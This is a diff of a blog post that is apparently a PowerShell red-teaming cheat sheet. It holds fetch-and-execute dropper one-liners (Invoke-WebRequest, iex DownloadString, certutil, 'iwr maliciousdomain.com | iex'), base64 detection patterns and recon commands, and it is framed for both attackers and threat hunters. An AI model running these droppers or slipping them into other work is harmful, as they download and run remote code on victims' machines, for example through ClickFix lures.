@@ -2,7 +2,7 @@
 layout: post
 title:  "Powershell for Red Teaming"
 date:   2025-05-23 21:00:00 +1000
-categories: scripts
+categories: pentesting
 ---
 
 <style>
@@ -15,17 +15,20 @@ categories: scripts
 
 ## Red teaming powershell scripts. Droppers and more.
 
+Bunch of potentially malicious powershell commands that are helpful in Red teaming but also useful for defenders to know. Seeing these commands in history is usually a sign of a successful compromise. However, a lot of these commands have legitimate administrative use as well.
+
 --- Threat Hunting Patterns ---
-Base64 is deterministic. Meaning there is no randomness. So, identifying patterns is important when threat hunting and creating SIEM rules.
+Base64 is deterministic. Meaning there is no randomness. Identifying B64 patterns is important when threat hunting and creating SIEM rules.
 - SQBuAHYAbwBrAGUALQBX (Invoke-WebRequest)
 - aQBlAHgAIAAoAE4AZQB3 (iex (New-Object Net.WebClient))
 
 ### Droppers
+Commonly used in Clickfix Prompts.
 --- Unencoded Droppers ---
 - ``` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" ``` (Downloads to disk)
 - ``` powershell -Command "iex(New-Object Net.WebClient).DownloadString('https://google.com/safe-script.ps1')" ``` (Downloads to memory)
 - ``` powershell -Command certutil -urlcache -split -f https://google.com/safe-script.ps1 payload.exe``` (LOLBAS Download)
-- ``` powershell iwr maliciousdomain.com | iex ``` ()
+- ``` powershell iwr maliciousdomain.com | iex ``` (Runs response in memory)
 
 ### Reverse Shell One-Liners
 --- TCP Rev Shell ---
@@ -43,3 +46,6 @@ Base64 is deterministic. Meaning there is no randomness. So, identifying pattern
 - ```Get-SmbShare```
 - ```net view \\hostname```
 - ```Get-Service | Where-Object {$_.Status -eq 'Running'}``` 
+- ```netstat -ano```
+
+--- AD Recon ---
